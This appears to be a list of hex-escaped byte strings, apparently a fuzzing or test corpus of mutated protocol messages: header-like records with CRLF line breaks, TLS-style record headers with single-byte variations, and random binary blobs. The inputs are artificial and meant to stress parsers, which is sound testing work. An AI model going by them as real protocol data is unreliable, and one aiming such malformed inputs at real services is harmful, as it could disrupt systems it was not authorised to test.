   "\xCA\x42\xC5\x8D\xCA\x35\x6C\x9E\x7F\x8A\xC7\x64\xF0\x97\xDC\x5E\xE5\x2E\x91\x16\xA2\x0C\x0E\x58\x10\x13\xB2\xEC\x44\x4C\x6D\xDE\x3D\x09\x1A\xD8\xF1\xD6\xD2\x3D\x9E\x0E\x89\x10\x3E\x7D\x80\xBC\x03\xF1\xA9\xEC\xC4\x7B\x4A\x08\x5D\xF4\xEC\xCB\x11\x61\x41\x8D\x42",
   "\x70\xF8\x69\xEE\x2E\xD9\x5C\x9E\x1F\x85\x03\x86\x82\xFB\xDE\xA9\x2B\x73\x56\x22\xF0\x15\x32\xD0\xCF\x0E\xF7\xDB\xD2\xC8\xEF\x29\x9E\x52\xFB\xB5\x59\xD8\xC8\x5B\x4A\xF8\x61\x03\xC4\xF4\x76\x2D\x03\xF6\x44\xBC\x2A\x6B\x75\x24\xDD\x1C\xB8\x5E\x98\x70\x5A\x36\xDA\xB3\xC0\x49\xBF\xDA\x3F\x88\x55\x41\xD3\xCC\x5B\xFD\x7A\x25\x5E\xC7\xF5\xA9\x8F",
   "\x64\xF8\x44\x26\x90\x41\x49\x8C\x19\x85\x67\x8B\xB4\x9E\xBB\x73\xCB\x6B",
   "\x78\xF8\x44\x26\x90\x41\x49\xEC\x1C\x8C\xD0\x0B\x12\xEB\x51\x53\xDF\xFE\x4E\x0E\x77\x19\x33\x9B\x63\x41\xA0\xEC\x46\x8E\x9B\x9C\x05\xB0\x00\xB3\x79\x7E\x5A\x20\xA5\x51\xC8\xBF\xDE\x7D\x48\xCD\xD5\x07\x0B\x3E\xAC\x58\x32\xB8\x2B\xF0\x2C\x14",
   "\x31\x61\x19\x6D\x3F\xA6\x30\xBF\xD5\x18\x22\x56\xA3\x22\xAA\xC8\x86\xDD\xCD\x65\x26\x75\x0A\x38\x35\x66\x1F",
   "\x31\x61\x19\x6D\x0B\xA6\x30\xBF\xD5\x18\x22\x56\xA3\x22\xA2\xC8\x06\xD2\xCD\x95\x25\x75\x0E\x3A\x69\x64\xD3\x78\x29\x97\xC7\x59\xA2\xB9\x55\x1E\xAF\x4B\xB6\x5E\xD7\xEC\xE0\x58\xE1\x71\x6B\x94\x28\x02\x83\xE0\x34\x14\xD6\xBF\xB5\xE7",
   "\x0F\x5B\x5E\xEB\x02\x2E\xB1\xA6\x26\x94\x6F\xFD\x2F\xC6\x4B\x72\x95\xCD\x83\xA4\x58\xC3\xCD\xC7\x81\xA0\xF7",
   "\x0F\x5B\x5E\xEB\xFA\x2E\xB1\xA6\x26\x94\x6F\xFD\x2F\xC6\x4B\x72\x15\xCD\x83\xA4\x58\xC3\x69\xC7\xC5\xA0\x3B\x1C\x5D\x7C\x8F\xE7\x72\x8C\xE1\xF8\x77\x91\x4F\xBE\x05\x4E\x3E\x60\x90\x93\xA8\x01\x02\xE3\x1E\xFF\x9F\x5A\x7F\xB0\xCB\x04\x02\xA8\x4A\x46\x29",
   "\x0F\x5B\x5E\xEB\x1E\x2E\xB1\xA6\x26\x94\x6F\xFD\x2F\xC6\x4F\x72\x95\xCD\x83\xA4\x58\xC3\x0D\xC7\x09\xA0\x0F\x2D\x3C\xFC\x3F\xFE\xCA\x4B\xFB\x4C\xBA\xF3\x01\x7A\xC8\xB7\xC1\x73\xFA\xE1\xA0\x3B\x9B\x1A\x9A\x00\x73\x17\xA3\x1C\xA4\x19\x5C\xFC\x28\x51\xBB\x45\xA9\x98",
   "\xCF\xA7\x4C\xD9\xA2\x74\x45\xA4\x1C\x61\x3F\x7B\x68\x1A\xB0\xE7\x4F\x94\xF4\x03\xC2\xA8\x8F\x0F\xC8\xE5\x0F\xB2\xE7\xAB\xC2\x17\x94\x64\x4B\x15\x4D\x42\x02\xA9\x9A\x4C\x4B\xED\xD0\x96\xDC\x1F\xBF\x26\xD9\x53\x04\x12\xA3\x30\x10\x3D\x64\x11\x7F\x10\x30\x61\xAA\x00\x47\xA1\x71\xB5\xF6\x99\xBC\x06\xE5\x39\x59\x44\xE3\xC9\xCC\x4F\xE4\x9A\x4A\x6C",
   "\xCB\xA7\xD9\x33\xD5\x8E\x3D\xDC\x50\xD9\xB0\x2C\xB8\x5D\x4F\x6D\x30\xA7\x4B\x93\x1D\x73\x20\xE0\x7F\x15\x7C\x1D\x5D\x8C\x9F\xED\x5F\xF7\xCD\x00\x7B\xF0\xC3\xC5\xE5\xC9\x8E\xE8\x90\xA3\xA0\xE7\xDE\x7F\xC2\xD0\x02\x6A\x43\xAA\x39\x3C\xA8\x65\x56\x81\x40\xAB\x52\x95\x40\xAA\xAC\xFC\x8F\x54\xEF\x90\x4E\x73\x4B\xBC\xE2",
   "\x37\xA6\xA4\xD9\x22\xE5\xAF\xB0\xC6\x84\x16\x55\x42\x71\x6A\x04\xF9\xF2\x45\xC0\xE8\x4B\x58\xAC\x22\x43\x33\xDB\x73\x73\x4C\xD8\x2D\x51\xE6\x1F\xAD\xA3\x35\x63\xB5\xD8\xF5",
        "\x4e\xe8\x59\x31\x00\x56\x5c\x48\x77\x43\xf7\x32\x77\x48\x48\x50\x2f\xed\xed\x0d\x0a\x4a\x48\x56\x3a\x20\x27\x57\x57\x55\x27\x7a\x27\x68\x27\x27\x27\x27\x33\x3a\x10\x20\x30\x30\x0d\x0a\x41\x53\x57\x3a\x20\x70\x6d\x6d\x3a\xb4\x6d\x77\x6f\x27\x48\x57\x0d\x0a\x41\x54\x3a\x20\x77\xdd\x6e\x6e\x27\x72\x69\x6e\x74\x69\x66\x6c\x6f\x72\x65\x27\x63\x54\x27\x6f\x67\x3a\x63\xf1\x6d\x6e\x62\x72\x42\x3a\x08\x0d\x0a\x46\x57\x5a\x2d\x4f\x3c\x40\x4f\x20\x6a\x4f\x4f\x27\x4c\x63\x6e\x3a\x20\x3c\x77\x27\x6d\x6d\x68\x65\x2f\xd8\x36\x75\x63\x27\x62\x0d\x0a\x0d\x0a\x00\x00",
        "\xd7\xe7\x59\xed\x50\x56\x5c\x48\x77\xba\x7f\x72\x77\x48\x48\x50\x2f\x88\xfd\x0d\x0a\x5a\x41\x56\x3a\x20\xc7\x68\x74\x47\x77\x6e\xa7\x66\x7a\x77\x69\x71\x30\x30\x0d\x0a\x55\x5a\x4d\x3a\x20\x70\x64\x64\x3a\xb7\x4f\x57\x42\x27\x66\x0d\x0a\x48\x57\x3a\x20\x68\xdd\xe7\x6f\x77\xa5\x69\x6e\x74\xed\x6c\x6f\x6b\x65\x67\x72\xee\x54\xee\x6f\x67\x7a\xcd\x6d\xfe\x62\xfe\x72\xee\xb9\x0d\x0a\x41\x4e\x41\x2d\x4f\xfd\x40\x4f\x20\x79\x4f\xee\x77\x4c\x62\xeb\x3a\x20\x73\x77\x72\x76\x68\xe1\x36\x75\xee\x77\x72\x4c\x0d\x0a\x0d\x0a\x00\x00",
        "\x4e\x18\x59\x31\x99\x56\x5c\x48\x77\x43\x6f\x72\x77\x48\x48\x50\x2f\xd9\xbe\x0d\x0a\x59\x46\x56\x3a\x20\xe8\x77\x54\x43\x77\x5e\x27\x67\x66\x77\x28\x39\x30\x30\x0d\x0a\x4d\x41\x4d\x3a\x20\x70\x6a\x6a\x3a\x57\x7f\x77\x27\x47\x79\x0d\x0a\x48\x54\x3a\x20\x7d\x33\x66\x55\x77\x72\x29\x6e\x74\xcb\x6c\x6f\x8d\x65\x6b\x72\xf8\x66\x73\x4f\x67\xbc\x74\xed\x6e\xb2\x72\xbe\x0d\x0a\x41\x45\x4a\x2d\x4f\xa7\x40\x4f\x20\x6a\x4f\x7e\x77\x7c\x6b\x9c\x3a\x20\x28\x77\x27\x46\x68\x4f\x32\x75\xdb\x77\x67\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x4d\xe2\x53\xef\x41\x56\x5c\x48\x77\x4a\xa7\x72\x77\x48\x48\x50\x2f\x19\x0e\x0d\x0a\x4b\x4e\x56\x3a\x20\x7f\x7a\x7f\x43\x77\x44\xee\x64\x66\x77\x4f\x31\x30\x30\x0d\x0a\x4c\x41\x4d\x3a\x20\x70\x44\x44\x3a\x43\x56\x28\x67\x27\x4a\x0d\x0a\x48\x53\x3a\x20\x33\x11\x66\x66\x77\x2d\x6e\x74\xb6\x6c\x6f\x6b\x65\x67\x72\x06\x54\x06\x6f\x67\x96\x43\x6d\x7e\x62\xde\x72\xb6\x0d\x0a\x4e\x4a\x41\x2d\x4f\x7a\x40\x4f\x20\xa8\x4f\x26\x77\x1c\xec\xcb\x3a\x27\x77\x27\x6e\x68\xfa\x36\x75\xdb\x77\xcb\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x4d\x2d\xfd\xe7\x4a\x56\x5c\x48\x77\xab\x7f\x72\x77\x48\x48\x50\x2f\xaf\x0d\x0a\x4f\x4e\x56\x3a\x20\xfa\x68\x7f\x47\x77\x6f\x27\x7a\x66\x7f\x69\x70\x30\x30\x0d\x0a\x4f\x45\x4d\x3a\x20\x70\x44\x66\x3a\xef\x59\x77\x77\x6e\x74\x0d\x0a\x49\x47\x3a\x20\x72\xdd\xab\x6f\x77\xbe\x69\x6e\x74\xcb\x6c\x6f\x6b\x65\x67\x72\x0f\x54\x0f\x6f\x67\xb2\x33\x6d\x73\x62\xb7\x72\xeb\x0d\x0a\x45\x42\x41\x2d\x4f\xb7\x40\x4f\x20\xe8\x4f\x4f\x77\x4c\xec\x1b\x3a\x20\x27\x77\x27\x72\x68\xe7\x36\x75\xcb\x77\x68\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\xc7\x6e\x53\x31\x48\x56\x5c\x48\x77\xc3\x7f\x72\x77\x48\x48\x50\x2f\x1d\xed\x0d\x0a\x4a\x56\x56\x3a\x20\xb7\x78\x68\x47\x77\x64\x27\x9a\x66\x77\x6e\x78\x30\x30\x0d\x0a\x55\x4f\x4d\x3a\x20\x70\x86\x64\x3a\xc7\x64\x77\x43\x27\x68\x0d\x0a\x50\x54\x3a\x20\x9d\x33\x66\x66\x77\x2f\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x67\x54\x67\x6f\x67\xdc\x68\x6d\x58\x62\xf9\x72\xe6\x0d\x0a\x42\x4e\x41\x2d\x4f\x77\x40\x4f\x20\xf2\x4f\x7b\x77\x1c\x0a\x1d\x3a\x20\x64\x77\x77\x56\x68\x64\x36\x75\x3a\x77\x84\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x4d\xdf\x53\xe1\x41\x56\x5c\x48\x77\xeb\xb8\x72\x77\x48\x48\x50\x2f\xfd\x7e\x0d\x0a\x4a\x4a\x56\x3a\x20\x7d\x77\x5f\x47\x77\x7e\xf1\x66\x66\x77\xcf\x30\x30\x30\x0d\x0a\x52\x4d\x4d\x3a\x20\x70\xdf\x77\x3a\x67\x64\x72\x27\x27\x4a\x0d\x0a\x4a\x55\x3a\x20\x3e\x33\x6e\x66\x77\x7f\x9e\x74\x6e\x6c\x6f\x6b\x65\x67\x72\xd4\x54\xd4\x6f\x67\xd0\x3b\x6d\x40\x62\xd6\x72\xe1\x0d\x0a\x45\x55\x41\x2d\x4f\xb9\x40\x4f\x20\x8c\x4f\x4a\x77\x4b\xef\xe3\x3a\x20\x77\x55\x27\xbf\x68\xf4\x36\x75\x8e\x77\x91\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x4d\x2d\xa4\x91\x27\x56\x5c\x48\x77\x61\x4c\x72\x77\x48\x48\x50\x2f\x1f\x78\x0d\x0a\x46\x4f\x56\x3a\x20\x67\x7e\x75\x47\x77\x4d\xd1\x3b\x66\x77\x72\xd7\x30\x30\x0d\x0a\x4f\x4d\x4d\x3a\x20\x70\x77\x3d\x3a\xd7\x64\x77\x43\x27\x65\x0d\x0a\x41\x54\x3a\x20\x75\x33\x66\x66\x77\xae\x6e\x74\x2e\x6c\x6f\x6b\x65\x67\x72\x1c\x54\x1c\x6f\x67\x3f\x74\x6d\x63\x62\xdd\x72\xe2\x0d\x0a\x52\x58\x41\x2d\x4f\xf7\x40\x4f\x20\x6c\x4f\x4e\x77\x44\x0d\x0d\x3a\x20\x43\x77\x77\x45\x68\xdd\x36\x75\x6e\x77\x6c\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\xd7\xa6\x39\x13\x05\x56\x5c\x48\x77\x4f\xc7\x72\x77\x48\x48\x50\x2f\xa1\x3e\x0d\x0a\x47\x46\x56\x3a\x20\x3e\x77\x6d\x47\x77\x1e\xf7\x66\x66\x77\x72\x2e\x30\x30\x0d\x0a\x48\x4d\x4d\x3a\x20\x70\xc4\x77\x3a\x67\x64\x77\x27\x27\x57\x0d\x0a\x41\x52\x3a\x20\x4d\x33\x66\x66\x77\x8e\x6e\x74\x5b\x6c\x6f\x6b\x65\x67\x72\x54\x54\x67\x6f\x67\x67\xc3\x6d\x82\x62\x67\x72\x96\x0d\x0a\x4e\x54\x41\x2d\x4f\x27\x40\x4f\x20\x82\x4f\x4e\x77\x08\x7f\x11\x3a\x20\x77\x77\x4d\x4e\x68\xfb\x36\x75\x2f\x77\x8c\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\xd7\x3d\x93\x75\x05\x56\x5c\x48\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x56\x19\x4e\x85\x06\x06\x26\x88\x77\x4f\xa0\x47\x77\x49\x69\x50\x2b\x19\x4e\x0d\x0a\x4d\x75\x56\x3a\x20\xa7\x76\x64\x47\x77\x3f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x6d\x4c\x3a\x20\x70\x44\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x26\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x61\x2d\x4f\x67\x40\x4f\x20\xc2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x36\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x75\x3d\xae\x75\x05\x56\x5c\x08\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x37\x3d\x93\x75\x05\x56\x5c\x48\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x85\x3c\x93\x85\x05\x56\x5c\x68\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\xd2\x3d\x93\x75\x05\x56\x5c\x08\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\xd7\x3d\x93\x75\x05\x56\x5c\x48\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\xc7\x3d\x93\x75\x05\x56\x5c\x98\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x07\x3d\x23\x75\x05\x56\x5c\x28\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x07\x3d\x93\x75\x05\x06\x5c\x48\x77\xae\x47\x72\x77\x48\x48\x50\x2f\x19\x5e\x0d\x0a\x4d\x54\x56\x3a\x20\xc7\x76\x64\x47\x77\x8f\xf6\x66\x66\x77\xef\xaf\x30\x30\x0d\x0a\x4a\x4d\x4c\x3a\x20\x70\x24\x77\x7a\x67\x64\x77\x43\x27\x7d\x0d\x0a\x42\x55\x3a\x20\x7d\x33\x66\x66\x77\xad\x6e\x74\x26\x6c\x6f\x6b\x65\x67\x72\x9a\x54\x9a\x6f\x67\x64\x8e\x6d\x32\x62\xd7\x72\x28\x0d\x0a\x51\x4e\x41\x2d\x4f\x67\x40\x4f\x20\xd2\x4f\x6e\x77\x91\xcc\x8b\x3a\x20\x77\x67\x4d\x46\x68\x2e\x36\x75\xc5\x77\xdc\x6c\x0d\x0a\x0d\x0a\x00\x00",
        "\x7b\x03\x4d\x00\x4f\x18\x10\x00\x12\x06\x10\x00\x7f\x00\x00\x01\x00\x00\x0f\x01\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        "\x16\x03\x01\x02\x50\x18\x40\x00\x40\x06\x20\x00\x7f\x00\x30\x01\x7f\x00\x00\x01\x00\xf2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        "\x65\x03\x01\x00\x50\x18\x40\x00\x26\x06\x20\x00\x7f\x5a\x00\x01\x7f\x00\x00\x01\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        "\x16\x03\x3f\x00\x50\x18\x40\x00\x40\x06\x93\x00\x7f\x00\x00\x01\x57\x00\x00\x01\xa0\xcd\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        "\x16\x03\x03\x00\x50\x18\x40\x00\x94\x06\x20\x00\x7f\x00\x00\x01\x23\x00\xf3\x01\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        "\x16\x03\x01\x00\x50\x5a\x40\x00\x40\x21\x20\x00\x7f\x00\x00\x01\x7f\x00\x00\x01\xa0\x02\x00\x33\x00\x00\x00\x00\x00\x00\x00\x00",
        "\x07\x03\x01\x00\x50\x18\x40\x10\x40\x5c\x20\x00\x7f\x00\x01\x01\x7f\x00\x00\x01\xa0\x02\x00\x00\x37\x00\x00\x00\x00\x00\x00\x00",
        "\xb9\x03\x01\x00\x50\x18\x40\x05\x40\x06\x20\x00\x07\x00\x00\x01\x7f\x00\x00\x01\xa0\x02\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00",
        "\x16\xaf\x01\x00\x50\x18\x40\x00\x40\x06\x20\x00\x7f\x00\x00\x01\x7f\x00\x00\x01\xa0\x02\x00\x78\x00\x00\x00\x00\x00\x00\x00\x00",
        "\x16\x03\x01\x00\x50\x18\x40\x00\x40\x06\xe9\x00\x7f\x00\x00\x01\x7f\x00\x00\x01\xa0\x02\x00\x00\x00\x17\x00\x00\x00\x00\x00\x00",
        "\x16\x03\x01\x00\x50\x18\x40\x00\x40\x06\x20\x00\x7f\x00\x00\x01\xee\x00\x00\x01\xa4\x02\x00\x00\x00\x00\x00",
        "\xb9\x13\x6c\x1b\x69\xf4\x22\xcd\x8f\x67\x48\xf5\xff\x64\x5b\x91\x84\x29\xc0\x30\x51\xd6\x86\xf8\xc8\xe1\x11\x32\xe6\x7e\x01\x6b\x37\x4a\xf5\x27\xcb\xf3\x44\x0d\xe6\x11\xe1\xfd\xe5\x4d\x48\xbb\xfa\x34\x05\x36\x05\x5a\xe4\xfa\x56\xa9\x02\xe6\x68\xe6\xb0\x85\x3a\x1e\x77\xfd\x4b\xb0\x1e\x2d\xc0\x35\x27\x45\x34\x04\xd8\xf2\xae\xc5\x87\x10\xf6\xd4\x6b\x57\xba\x9e\x9c\x49\x48\x1b\xe4\x11\xca\x35\x31\x63\xe2\x06\x87\xf8\xf3\xa7\x23\x73\xda\xb5\x7f\x1f\xf2\x4f\x8f\x79\x5a\xb7\xbc\x34\xe2\xe6\x06\x1c\xcc\xec\x1c\x27\x4a\x57\fa\x11",
        "\x9a\x0e\x48\x0b\x7a\x59\x75\x1e\x5c\x0b\xed\x33\x8b\x8d\xf2\x0e\x86\x1d\x14\x8a\x52\xea\xf8\x67\x69\xae\xd9\x02\x16\xf1\xf8\x08\x15\x2d\x61\x24\xa6\xc5\x61\xa5\x0e\xf0\x04\x89\xce\xfd\x8a\x5c\x77\xf0\x27\x42\x64\xe7\x02\x97\xf8\x0b\xd1\x42\x29\x0a\x8e\xd1\xe0\x69\x79\x2b\x5d\xab\xb3\xf1\xff\xd3\x09\x5c\x38\x09\x52\x7e\xa8\x86\xd3\x74\xb9\x34\x47\x3e\x3f\xd7\x32\xc4\x0e\x2b\x45\x9b\x2b\x7b\x19\xc4\x16\xc3\x76\x1f\xf2\x37\x32\x62\xbe\x5a\xc7\x71\x91\x08\xb0\xda\xa1\xfe\x42\x75\x86\xab\x64\x3a\x60\x23\xe9\x1e\xe7\xee\xb8",
        "\xa4\x8a\x5b\x1e\x20\x71\x26\x1b\xc6\x2b\xcd\xba\x6d\xe9\xb0\xe6\x54\x25\x87\xf3\x6e\xde\xe9\xa4\x3b\xf6\x0f\x05\x2e\x69\xb2\x6c\x3d\xb9\xb9\x50\x1b\x16\x4b\x6c\x9b\xa4\x2f\x94\x77\x61\x68\xff\xb5\xe3\xea\xa0\x82\x97\x3d\xb4\x6e\x8b\x95\xed\xaf\x50\xdd\xb0\x3e\x48\x31\x2a\x40\xbe\x03\xda\xdc\x71\x61\x22\x80\x48\xdc\x0b\x64\x71\xc8\xd3\x42\x44\x69\x37\x91\x6c\x08\x92\x9e\x52\x4c\xef\x8a\x32\xf0\xe2\x4d\x14\x3e\xf1\xcf\xd2\x19\xe0\xfb\xf0\x86\x1d\x42\x05\xab\x2d\x44\x5c\xe8\x0a\x96\x4a\x1e\xd3\x3b\x5d\xf5\x99\x99\xe9\x9c\x90",
        "\xe6\x62\x7d\x86\x94\x47\x6f\x0c\xc4\xcc\x15\x62\x52\x8a\x42\xe0\x70\x6d\xe0\xd7\x1a\x64\x7a\x21\xf0\x6f\x4a\xda\x0d\xa5\x7e\x07\x63\x85\x07\x6d\x4f\x42\x52\x6c\x7b\x69\x05\x76\x22\x84\x1b\xec\x1d\x9e\x40\x23\xe0\x06\x2d\x1e\xe3\x4a\x33\x86\x2e\xa8\x5d\x2e\xc5\x7b\x3c\x5d\x70\x8b\x2b\x9c\x64\x09\x81\x42\x9c\x2b\x4c\x1b\x2d\x3c\xe2\xa1\xf3\x50\xee\x0f\xe7\x54\x69\x33\x77\x66\x33\x49\x07\x1b\x1d\xe6\x43\xda\xc7\x13\xc1\xca\x93\xca\xec\x41\xbd\x97\x3a\xb3\x7d\x18\xe8\x36\x06\x78\x51\x5a\x7e\x14\x9e\x4c\x44\xbe\x48\x5d\xb1\x50",
        "\xa9\xec\x72\xe3\x5a\xf3\x30\x23\x56\x8e\x0c\x59\x3e\xa4\x13\x61\x5f\x99\x3b\x8e\x06\x8e\x44\x80\x0f\x87\x5e\xef\xf3\x7a\xbc\xc7\xfc\x73\xa9\xdf\x6f\x4d\xc7\xde\x60\xa6\x89\xf5\xc9\x40\xca\x5f\xe6\xae\x8d\x52\x15\x4c\x66\x2b\x1c\x59\x5b\xab\xcc\x81\x1e\x0b\x02\x7d\x43\x0f\x44\x43\x6d\xfe\x9c\x02\x20\x61\x35\x7c\x5b\xed\xbe\x3e\x90\xa0\x86\xa7\x90\x65\x5f\xab\x95\xf6\x5f\xb3\xdb\x98\xfb\xc4\x10\x06\x95\xd9\x65\xfc\xa4\x06\x3a\x51\xe6\x6e\x22\x24\x0a\x1c\xf7\xe9\x12\x09\x03\x8d\x33\xa3\x2b\x24\x61\x68\x9e\x4d\xce",
